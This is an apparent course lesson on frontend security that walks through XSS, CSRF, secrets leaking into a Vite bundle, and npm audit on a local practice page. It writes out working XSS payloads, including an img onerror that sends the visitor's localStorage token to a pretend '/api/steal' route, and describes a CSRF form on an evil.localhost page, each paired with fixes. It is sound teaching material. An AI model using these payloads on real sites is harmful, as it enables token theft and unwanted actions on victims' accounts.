# M13-L03 · Frontend Security

> Video: Module 13, Lesson 3. Watch it first, then follow along here.

Asha added a reviews box to the course page. Students write kind words and the page shows them. Then a stranger leaves a review that looks friendly but hides a small piece of code. In this lesson you meet four dangers on a practice page on your own laptop, and learn how to stop each one: cross-site scripting (XSS), cross-site request forgery (CSRF), secrets inside the bundle, and other people's code.

> Everything here runs on your own computer, against a practice API. Never try any of it on a site that is not yours.

## What you'll learn

- XSS: other people's text running as code in your page. React shows text safely; `dangerouslySetInnerHTML` turns that off
- Two good fixes: show text as text, or clean it with DOMPurify first
- CSRF: the browser attaches your cookie to a request that started on another website. `SameSite=Lax` and a CSRF token stop it
- Why anything in the bundle is public, and what the `VITE_` prefix means
- `npm audit`: checking other people's code, and fixing it with a version change
- Five mistakes to avoid

## Before you start

- Node 24 (`node --version`; recorded with v24.16.0).
- You know the token and cookie ideas from [M13-L01](../m13-l01-login-flows-sessions-vs-jwt/README.md) and roles from [M13-L02](../m13-l02-protected-routes-and-roles/README.md).
- Google Chrome is useful for the CSRF demo (it resolves `evil.localhost` to your own machine). Docker is not used.
- Every key, password and token here is fake: `practice-token-123`, `sk_test_FAKE_not_a_real_key_7f3a`, `also-fake-hunter2`. The "other website" is a local page on `evil.localhost`.

## Files in this folder

| File | What it is |
|---|---|
| `package.json` | Pinned: React 19.3.1, dompurify 3.4.17, Vite 8.3.5, TypeScript 7.0.2 |
| `src/Reviews.tsx` | The reviews list, finished version: bold words work, text is cleaned with DOMPurify |
| `src/App.tsx`, `src/main.tsx`, `src/types.ts`, `src/index.css` | The course page. `main.tsx` stores the fake token `practice-token-123` in `localStorage` |
| `api/server.mjs` | Practice API on port 8133: reviews, login (cookie), cancel enrolment, a pretend attacker route `/api/steal`, and a request log |
| `evil/` | The "other website" for the CSRF demo (`evil.html` and a tiny server on port 5236) |
| `audit/package.json` | A tiny project with an old lodash pinned exactly (4.17.15) for the `npm audit` demo |
| `.env.example` | Two FAKE values for the secrets demo |
| `versions/` | `v1` (React default: text), `v2` (`dangerouslySetInnerHTML`), `v3` (DOMPurify, same as `src/`), `v4` (a payment key in a `VITE_` variable) |

Switch stage by replacing `src/` (Vite reloads):

```bash
find src -type f -delete && cp versions/v1/* src/
```

Put `versions/v3` back at the end.

## Follow along

### 1. Install and start

```bash
npm install
node api/server.mjs
```

```text
API on http://localhost:8133
```

In a second terminal:

```bash
npm run dev
```

```text
  VITE v8.3.5  ready in ... ms

  ➜  Local:   http://localhost:5233/
```

The API keeps a request log. Read it any time with `curl http://localhost:8133/log`, and empty it (and the reviews) with `curl -X POST http://localhost:8133/reset`.

### 2. XSS: React is safe by default (stage v1)

```bash
find src -type f -delete && cp versions/v1/* src/
```

`Reviews.tsx` shows one review like this. The text goes inside curly braces, and that is the safe way:

```tsx
<p>{r.text}</p>
```

Save the stranger's review on the server. Its words include a picture tag with code hidden inside:

```bash
curl -X POST localhost:8133/api/reviews -H 'content-type: application/json' \
  -d '{"author":"Stranger","text":"Great course! <img src=x onerror=\"fetch('"'"'/api/steal?t='"'"'+localStorage.token)\">"}'
```

Open http://localhost:5233/. Guess: does the picture appear and the code run, or does the page show the words as plain text? Plain text. Curly braces always make text, never code. The angle brackets are just letters on the screen, and the log has no `steal` line:

```bash
curl localhost:8133/log
```

```text
POST /api/reviews
GET /api/reviews
```

Meera's review (`Thank you all! <b>Keep practising every day.</b>`) shows its tags too, which looks messy. Asha searches the internet and finds a way to show real bold words.

### 3. The scary name (stage v2)

```bash
curl -X POST localhost:8133/reset
find src -type f -delete && cp versions/v2/* src/
```

`dangerouslySetInnerHTML` tells React: trust this text, treat it as real HTML. It takes an object with one key, `__html`:

```tsx
<p dangerouslySetInnerHTML={{ __html: r.text }} />
```

Meera's words are really bold now. Asha ships it. Now a stranger tries the classic trick, a `<script>` tag:

```bash
curl -X POST localhost:8133/api/reviews -H 'content-type: application/json' \
  -d '{"author":"Stranger2","text":"Nice. <script>fetch('"'"'/api/steal?t=script-tag'"'"')</script>"}'
```

Reload the page. The script does not run: the page shows `Nice.` and the log has no `steal` line. Browsers refuse to run script tags that arrive this way. But Asha should not relax. A second stranger uses a picture tag whose address is nonsense, so the picture fails to load, and a failing picture runs whatever is in its `onerror` attribute:

```bash
curl -X POST localhost:8133/reset
curl -X POST localhost:8133/api/reviews -H 'content-type: application/json' \
  -d '{"author":"Stranger","text":"Great course! <img src=x onerror=\"fetch('"'"'/api/steal?t='"'"'+localStorage.token)\">"}'
```

Reload the page (it shows a small broken picture and nothing else looks wrong), then read the log:

```bash
curl localhost:8133/log
```

```text
POST /api/reviews
GET /api/reviews
GET /api/steal t=practice-token-123
```

A `steal` request arrived, carrying the login token read from the visitor's browser storage by the stranger's code. A real visitor would have seen nothing at all. Code inside your page has all the power of your page.

Rule: never hand text from other people to `dangerouslySetInnerHTML`. Reviews, comments, names, anything from a form, a link or an API is untrusted.

### 4. The two fixes (stage v3)

1. Do not use it. Show the text as text (stage `v1`). If you want bold, offer a bold button and let your own code add the tag.
2. If you truly must show HTML, clean it first with DOMPurify, which keeps harmless parts like `<b>` and removes dangerous ones like `onerror`:

```tsx
import DOMPurify from 'dompurify'

<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(r.text) }} />
```

```bash
curl -X POST localhost:8133/reset
find src -type f -delete && cp versions/v3/* src/
# add the stranger's review again (the picture one from step 3), then reload the page
```

What the page's tree now holds, from the browser console (`document.querySelectorAll('.card p')` and read `innerHTML`):

```text
Thank you all! <b>Keep practising every day.</b>
Great course! <img src="x">
```

The bold tags survived, the `<script>` text is gone, and the picture's `onerror` attribute was removed. The log has no `steal` line. Rule of thumb: if you did not write the text yourself, show it as text, or clean it first.

### 5. CSRF: the cookie that is sent by itself

A hotel key card opens the door for whoever holds it, and the door never asks who sent you. Browsers treat cookies the same way: once Asha is logged in, her browser attaches her cookie to every request for that server, even when the request starts on another website.

Switch the practice API to a weak cookie (`SameSite=None`) and log in. The cookie the server sent:

```bash
curl -X POST "localhost:8133/mode?samesite=None"
curl -si -X POST localhost:8133/api/login | grep -i set-cookie
```

```text
set-cookie: sid=asha-session; HttpOnly; Path=/; SameSite=None; Secure
```

`SameSite=None` means: attach this cookie even when the request comes from another site. `HttpOnly` means page code cannot read it. `Secure` means encrypted connections only.

Now the pretend bad website. In a third terminal:

```bash
node evil/serve.mjs
```

```text
other site on http://evil.localhost:5236
```

`evil/evil.html` has a button "Claim my prize" that is secretly a form posting to `http://localhost:8133/api/enrollments/cancel`. To act as Asha, log in in the browser first: open http://localhost:5233/ (the page of the course) and in the console run `fetch('/api/login', { method: 'POST' })`. Then open http://evil.localhost:5236/ in the same browser and press Claim my prize. Guess: what happens to her enrolment? It is cancelled:

```text
Done
Your enrolment was cancelled.
```

```bash
curl localhost:8133/log
curl localhost:8133/state
```

```text
POST /api/login
POST /api/enrollments/cancel
  cookie: sent (asha)
  -> enrolment cancelled for asha
{"enrolled":false,"mode":"None"}
```

The prize site never saw the cookie. It did not need to: Asha's own browser attached it.

The first defence lives on the cookie. Reset, switch to `SameSite=Lax`, log in again in the browser, and press the same button:

```bash
curl -X POST localhost:8133/reset
curl -X POST "localhost:8133/mode?samesite=Lax"
```

```text
401
Please log in first.
```

```text
POST /api/enrollments/cancel
  cookie: not sent
```

(Open a fresh private window, or clear cookies for `localhost`, between the two runs.) Modern browsers already default to Lax, so you are mostly protected, but only if nobody switches it off. The second defence is a secret CSRF token that only your own pages know, which the server checks on every change. A token in a header is never attached by the browser by itself. Each choice trades one risk for another, the same trade-off as in lesson 1.

### 6. A secret inside the bundle (stage v4)

```bash
find src -type f -delete && cp versions/v4/* src/
cp .env.example .env
cat .env
```

```text
# Demo values only: both are FAKE. ...
VITE_PAYMENT_KEY=sk_test_FAKE_not_a_real_key_7f3a
DATABASE_PASSWORD=also-fake-hunter2
```

`src/pay.ts` reads the first one: `import.meta.env.VITE_PAYMENT_KEY`. Vite passes a variable to the page only if its name starts with `VITE_`. The database password has no such name. Build for production, and look inside the files every visitor downloads:

```bash
npm run build
ls dist/assets
grep -o "sk_test_[A-Za-z0-9_]*" dist/assets/*.js
grep -o "hunter2" dist/assets/*.js
```

```text
index-CJ4IqlqC.css
index-GRLCcx3-.js
sk_test_FAKE_not_a_real_key_7f3a
```

The payment key is there in plain text, in the JS file. The second `grep` prints nothing (exit code 1): the database password stayed out only because it has no prefix and nothing in the page uses it. (File hashes in the names may differ.) Making the code smaller does not hide anything.

The `VITE_` prefix is a warning in disguise: it means "this value will be public". Public values, like the API address, are fine. A real secret lives on the server only. If the page needs something done with a secret, it asks your server, which does the work and sends back just the result. If a secret has ever shipped, deleting it is not enough: replace it with a new one.

Clean up: `rm .env` (it must never be committed) and restore `versions/v3` into `src/`.

### 7. Other people's code: `npm audit`

`audit/package.json` is a small project with an old lodash pinned exactly:

```bash
cd audit
npm install
npm audit
```

```text
# npm audit report

lodash  <=4.17.23
Severity: high
Command Injection in lodash - https://github.com/advisories/GHSA-35jh-r3h4-6jhm
Prototype Pollution in lodash - https://github.com/advisories/GHSA-p6mc-m468-83gw
...
fix available via `npm audit fix --force`
Will install lodash@4.18.1, which is outside the stated dependency range
node_modules/lodash

1 high severity vulnerability
```

(I filtered the long report. The audit list is live, so your report may list more or different advisories over time.) Read the advice instead of blindly forcing it. Change the version in `package.json` from `4.17.15` to `4.18.1`, then:

```bash
npm install
npm audit
npm ls lodash
```

```text
found 0 vulnerabilities
audit-demo@1.0.0 ...
`-- lodash@4.18.1
```

Make it a habit: run `npm audit` now and then, and in your build pipeline later in the course. Keep your list of packages short, update often, and run your tests after an update, because a forced upgrade can break your app.

## Common mistakes

1. `dangerouslySetInnerHTML` on text from other people.
2. A secret inside a `VITE_` variable.
3. `SameSite=None` with no reason.
4. Ignoring `npm audit` warnings until a real attack.
5. Believing that hiding a button is security (lesson 2). The server must still say no.

## Clean up

Press Ctrl+C in all terminals. Reset the practice API (`curl -X POST localhost:8133/reset`), delete `.env` if you made one, put `versions/v3` back into `src/`, and delete `audit/node_modules`, `audit/package-lock.json`, `node_modules` and `dist` if you like.

## Try it yourself

On your own practice page, show a review with DOMPurify and without it, and look at what the page's tree holds each time (`innerHTML` of the `<p>` in the browser's Elements panel).

Interview tip. "Is React safe from XSS?" Mostly, because it escapes text by default. But `dangerouslySetInnerHTML`, and the packages you install, can still open the door.

## Next

[M13-B09 · Build a Secure allcsvideos Frontend](../m13-b09-build-a-secure-allcsvideos-frontend/README.md)
